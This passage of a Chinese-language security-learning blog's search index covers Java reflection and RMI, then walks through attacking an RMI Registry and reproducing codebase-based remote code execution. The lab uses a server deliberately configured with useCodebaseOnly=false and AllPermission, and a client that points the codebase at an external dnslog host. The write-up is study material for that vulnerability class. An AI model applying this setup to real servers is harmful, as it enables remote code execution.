class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        System.out.println(<span class="hljs-string">&quot;khasjdk&quot;</span>);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="8、setAccessible"><a href="#8、setAccessible" class="headerlink" title="8、setAccessible"></a>8、setAccessible</h2><ul><li>Method和Field、Constructor对象都有setAccessible()方法。</li><li>setAccessible作用是启动和禁用访问安全检查的开关。</li><li>参数值为true则指示反射的对象在使用时应该取消Java语言访问检查。</li><li>提高反射的效率。如果代码中必须用反射，而该句代码需要频繁的被调用，那么请设置为true。</li><li>使得原本无法访问的私有成员也可以访问</li><li>参数值为false则指示反射的对象应该实施Java语言访问检查</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RMI</title>
    <link href="/Decemberus.github-io/2022/10/30/RMI/"/>
    <url>/Decemberus.github-io/2022/10/30/RMI/</url>
    
    <content type="html"><![CDATA[<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="一些基本知识"><a href="#一些基本知识" class="headerlink" title="一些基本知识"></a>一些基本知识</h2><p>RMI全称是Remote Method Invocation，远程⽅法调⽤。从这个名字就可以看出，他的⽬标和RPC其实是类似的，是让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法，只不过RMI是Java独有的⼀种机制。<code>RMI</code>用于构建分布式应用程序，<code>RMI</code>实现了<code>Java</code>程序之间跨<code>JVM</code>的远程通信。</p><p>RMIServer分为三部分</p><ul><li>继承了java.rmi.Remote的接口，其中定义要远程调用的函数，比如这里的<code>hello()</code></li><li>一个实现了接口的类</li><li>一个主类，用来创建Registry，并且把上面的类实例化以后绑定到一个地址，就是所谓的Server了</li></ul><p><strong>RMIServer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteHelloWorld</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteHelloWorld</span> &#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteHelloWorld</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-built_in">super</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>            System.out.println(<span class="hljs-string">&quot;call from&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>();<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Naming.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);<br>        <span class="hljs-comment">//rebind有两个参数</span><br>        <span class="hljs-comment">//name：表示要绑定的远程对象在RMI Registry中的名称，这是一个字符串类型的参数。</span><br><span class="hljs-comment">//obj：表示要绑定的远程对象，它必须实现java.rmi.Remote接口。</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIServer</span>().start();<br><br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在本地使⽤⼀样了</p><p><strong>RMIClient.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, NotBoundException, RemoteException &#123;<br>        RMIServer.<span class="hljs-type">IRemoteHelloWorld</span> <span class="hljs-variable">Hello</span> <span class="hljs-operator">=</span> (RMIServer.IRemoteHelloWorld)Naming.lookup(<span class="hljs-string">&quot;rmi://192.168.1.115:1099/Hello&quot;</span>);<br>        <span class="hljs-comment">//这里强制转换的原因是Naming.lookup返回的是一个String对象，只有把他转换为IRemoteHelloWorld之后才可以调用我们的server中的方法</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> Hello.hello();<br>        System.out.println(hello);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>在 RMI 的远程调用中，客户端与服务器之间的通信是通过网络进行的。客户端在远程调用服务器上的对象时，实际上并不是直接调用服务器端的实现类（比如 <code>RemoteHelloWorld</code>），而是通过服务器端发布的远程接口来调用相应的方法。</p></blockquote><p>虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝IRemoteHelloWorld ⾥，因为客户端也需要⽤到这个接⼝。</p><p>使用的具体流程是</p><p>先开启RMIServer，然后再开启客户端</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107462.png" alt="image-20230225210904011"> </p><blockquote><p>关于这里Hello和hello的提示</p><p>在 <code>Naming.rebind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h)</code> 中，”Hello” 是注册表中绑定到 <code>RemoteHelloWorld</code> 对象的名称。这个名称是区分大小写的，而不是与 <code>RemoteHelloWorld</code> 中的 <code>hello</code> 方法相关的名称。</p><p>当 RMI 服务器使用 <code>Naming.rebind()</code> 方法将 <code>RemoteHelloWorld</code> 实例绑定到名称为 “rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello” 的 RMI 注册表中时，客户端可以使用 “rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello” 名称来查找此 RMI 对象。这里的名称区分大小写，所以必须使用 “Hello” 而不是 “hello” 来查找该 RMI 对象。</p><p>绑定的是一个名称。和hello方法没有关系</p></blockquote><p>我们可以抓包看看RMI的通信过程。</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107086.png" alt="img"> </p><p>这就是完整的通信过程，我们可以发现，整个过程进⾏了两次TCP握⼿，也就是我们实际建⽴了两次TCP连接。</p><p>第⼀次建⽴TCP连接是连接远端 192.168.1.115 的1099端⼝，这也是我们在代码⾥看到的端⼝，⼆者进⾏沟通后，我向远端发送了⼀个“Call”消息，远端回复了⼀个“ReturnData”消息，然后我新建了⼀个TCP连接，连到远端的53758端⼝。（应该来说每个人连到远端端口不一样）</p><p><img src="D:/mdimage/t016210c896f395c13f.png" alt="img"> </p><p>下面的新建的TCP连接的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107511.png" alt="img"> </p><p>所以捋⼀捋这整个过程，⾸先客户端连接Registry，并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息；然后Registry返回⼀个序列化的数据，这个就是找到的Name&#x3D;Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在192.168.1.115:53758 ，于是再与这个地址建⽴TCP连接；在这个新的连接中，才执⾏真正远程⽅法调⽤，也就是 hello() 。</p><p>我们借⽤下图来说明这些元素间的关系（来原p师傅）<img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107901.png" alt="img"></p><p>简单的说：RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。</p><p>总结一下，一个RMI过程有以下三个参与者：</p><blockquote><p>RMI Registry</p><p>RMI Server</p><p>RMI Client</p></blockquote><p>但是为什么我给的示例代码只有两个部分呢？原因是，通常我们在新建一个RMI Registry的时候，都会直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了Registry和Server两部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>());<br></code></pre></td></tr></table></figure><p>第一行创建并运行RMI Registry，第二行将RemoteHelloWorld对象绑定到Hello这个名字上。</p><p>Naming.bind 的第一个参数是一个URL，形如： rmi:&#x2F;&#x2F;host:port&#x2F;name 。其中，host和port就是RMI Registry的地址和端口，name是远程对象的名字。</p><p>如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认是 1099 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Naming.bind(<span class="hljs-string">&quot;Hello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>());<br></code></pre></td></tr></table></figure><p>以上就是RMI整个的原理与流程。接下来，我们很自然地想到，RMI会给我们带来哪些安全问题？</p><p>从两个方向思考一下这个问题：</p><ol><li><p>如果我们能访问RMI Registry服务，如何对其攻击？</p></li><li><p>如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地址），能不能进行攻击？</p></li></ol><h2 id="如何攻击RMI-Registry"><a href="#如何攻击RMI-Registry" class="headerlink" title="如何攻击RMI Registry"></a>如何攻击RMI Registry</h2><p>当我们可以访问目标RMI Registry的时候，会有哪些安全问题呢？</p><p>首先，RMI Registry是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。我们可以尝试直接访问“后台”功能，比如修改远程服务器上Hello对应的对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>();<br>Naming.rebind(<span class="hljs-string">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>, h);<br></code></pre></td></tr></table></figure><p>发生了这样的错误</p><img src="D:/mdimage/image-20221231104143549.png" alt="image-20221231104143549" style="zoom:150%;" /> <p>原来Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、bind、unbind等方法。</p><p>不过list和lookup方法可以远程调用。</p><p>list方法可以列出目标上所有绑定的对象：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">String[] s <span class="hljs-operator">=</span> Naming.list(<span class="hljs-string">&quot;rmi://192.168.135.142:1099&quot;</span>)<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><p>lookup作用就是获得某个远程对象。</p><p>那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用，之前曾经有一个工具</p><p><a href="https://github.com/NickstaDB/BaRMIe%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%B8%80%E4%B8%AA%E5%8A%9F%E8%83%BD%E5%B0%B1%E6%98%AF%E8%BF%9B%E8%A1%8C%E5%8D%B1%E9%99%A9%E6%96%B9%E6%B3%95%E7%9A%84%E6%8E%A2%E6%B5%8B%E3%80%82">https://github.com/NickstaDB/BaRMIe，其中一个功能就是进行危险方法的探测。</a></p><p>但是显然，RMI的攻击面绝不仅仅是这样没营养。</p><h2 id="RMI利用codebase执行任意代码"><a href="#RMI利用codebase执行任意代码" class="headerlink" title="RMI利用codebase执行任意代码"></a>RMI利用codebase执行任意代码</h2><p>曾经有段时间，Java是可以运行在浏览器中的，对，就是Applet这个奇葩。在使用Applet的时候通常需要指定一个codebase属性，比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;applet code=<span class="hljs-string">&quot;HelloWorld.class&quot;</span> codebase=<span class="hljs-string">&quot;Applets&quot;</span> width=<span class="hljs-string">&quot;800&quot;</span> height=<span class="hljs-string">&quot;600&quot;</span>&gt;<br>&lt;/applet&gt;<br></code></pre></td></tr></table></figure><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p><p>如果我们指定 <code>codebase=http://example.com/</code> ，然后加载 org.vulhub.example.Example 类，则Java虚拟机会下载这个文件 <code>http://example.com/org/vulhub/example/Example.class</code> ，并作为Example类的字节码。</p><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。</p><p>这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？</p><p>对，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p><p>不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：</p><ul><li>安装并配置了SecurityManager</li><li>Java版本低于7u21、6u45，或者设置了java.rmi.server.useCodebaseOnly&#x3D;false</li></ul><p>其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置：</p><blockquote><p><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a></p><p><a href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></p></blockquote><p>官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的codebase ，不再支持从RMI请求中获取</p><p>我们来编写一个简单的RMIServer用于复现这个漏洞。建立4个文件,记住一定要部署在服务器上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">//Calc</span><br><span class="hljs-keyword">package</span> codebase;<br><br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">sum</span><span class="hljs-params">(List&lt;Integer&gt; params)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Integer sum=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (Integer param:params)&#123;<br>            sum +=param;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ICalc</span><br><span class="hljs-keyword">package</span> codebase;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICalc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">sum</span><span class="hljs-params">(List&lt;Integer&gt; params)</span> <span class="hljs-keyword">throws</span> Exception;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//RemoteRMIServer</span><br><span class="hljs-keyword">package</span> codebase;<br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteRMIServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">if</span>(System.getSecurityManager()==<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;start Security&quot;</span>);<br>            System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityManager</span>());<br><br>        &#125;<br>        <span class="hljs-type">Calc</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calc</span>();<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Naming.rebind(<span class="hljs-string">&quot;refobj&quot;</span>,a);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteRMIServer</span>().start();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//client.<span class="hljs-keyword">policy</span><br><span class="hljs-keyword">grant</span> &#123;<br>permission java.<span class="hljs-keyword">security</span>.AllPermission;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这个如果在本机部署的话会出现很多错误，所以只能部署在服务器上</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">javac</span> <span class="hljs-regexp">*.java</span><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/jvm/</span>java-<span class="hljs-number">11</span>-openjdk-<span class="hljs-number">11.0</span>.<span class="hljs-number">18.0</span>.<span class="hljs-number">10</span>-<span class="hljs-number">1</span>.el7_9.x86_64<span class="hljs-regexp">/bin/</span>java -Djava.rmi.server.hostname=<span class="hljs-number">110.42</span>.<span class="hljs-number">158.239</span> -Djava.rmi.server.useCodebaseOnly=<span class="hljs-keyword">false</span> -Djava.security.policy=client.policy RemoteRMIServer<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107109.png" alt="image-20230226104201093"> </p><p>成功</p><p>接下来我们需要在本机上创建一个Client</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> codebase;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Payload</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ArrayList</span>&lt;Integer&gt;&#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lookup</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ICalc r= (ICalc)Naming.lookup(<span class="hljs-string">&quot;rmi://110.42.158.239/refObj&quot;</span>);<br>        List&lt;Integer&gt; li=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Payload</span>();<br>        li.add(<span class="hljs-number">3</span>);<br>        li.add(<span class="hljs-number">4</span>);<br>        System.out.println(r.sum(li));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIClient</span>().lookup();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192108062.png" alt="image-20230226110152067"> </p><p>添加程序参数</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-Djava<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.useCodebaseOnly=false -Djava<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.codebase=hz0vdn<span class="hljs-selector-class">.dnslog</span>.cn<br></code></pre></td></tr></table></figure><p>运行以后出现这个错误</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192108592.png" alt="image-20230226110122197"> </p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
